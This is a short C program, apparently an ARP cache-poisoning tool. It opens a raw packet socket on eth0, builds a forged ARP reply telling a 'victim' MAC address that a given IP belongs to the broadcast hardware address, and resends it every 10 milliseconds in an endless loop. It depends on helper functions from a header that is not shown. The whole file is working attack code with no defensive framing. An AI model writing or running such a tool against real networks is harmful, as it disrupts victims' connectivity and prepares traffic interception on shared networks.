#include <sys/socket.h>
#include <sys/types.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include "common.h"
#include <time.h>
int main(int c, char *z[])
{
	int		packet_socket = socket(AF_PACKET, SOCK_RAW, 0x0806);
	struct sockaddr_ll	sa_ll;
	memset(&sa_ll, 0, sizeof(struct sockaddr_ll));
	sa_ll.sll_protocol = 0x0608, sa_ll.sll_ifindex = get_ifindex(packet_socket, "eth0"), sa_ll.sll_halen = 6;
	strcpy(sa_ll.sll_addr, "\xff\xff\xff\xff\xff\xff");
	char	victim[6];
	conv_mac(z[1], victim);
	char	msg[1526];
	int	len = mk_arp_reply_packet(msg, "\xff\xff\xff\xff\xff\xff", victim, 0x0, conv_ip(z[2]), 1);
	struct timespec	t;
	t.tv_sec = 0, t.tv_nsec = 10000000;
	while (1) {
		errn1(sendto(packet_socket, msg, len, 0, (struct sockaddr*)&sa_ll, sizeof(struct sockaddr_ll)), "sendto error");
		nanosleep(&t, NULL);
	}
	return 0;
}
